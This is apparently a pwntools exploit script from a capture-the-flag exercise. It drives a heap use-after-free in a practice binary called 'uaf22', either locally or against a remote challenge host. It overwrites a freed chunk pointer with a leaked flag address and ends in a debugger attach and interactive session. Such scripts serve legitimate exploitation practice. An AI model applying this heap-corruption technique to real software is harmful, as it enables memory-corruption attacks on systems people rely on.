#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/30 16:48:14
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('uaf22')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = '1.14.160.21'
    port = 20004
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('uaf22')

def add():
    sh.recvuntil("> ")
    sh.sendline("Allocate Last Chunk")

def dele():
    sh.recvuntil("> ")
    sh.sendline("Free Last Chunk")

def edit(content):
    sh.recvuntil("> ")
    sh.sendline("Edit Last Chunk")
    sh.recvuntil("Data: ")
    sh.send(content)

def show():
    sh.recvuntil("> ")
    sh.sendline("Print First Chunk")


sh.recvuntil("The address of the flag is: 0x")
flag_addr = int(sh.recv(12),16)
log.info("Success ger flag_addr:0x%x"%flag_addr)
add()
add()
add()
dele()
dele()
add()
edit(p64(flag_addr-0x10))
gdb.attach(sh)
pause()
sh.interactive()

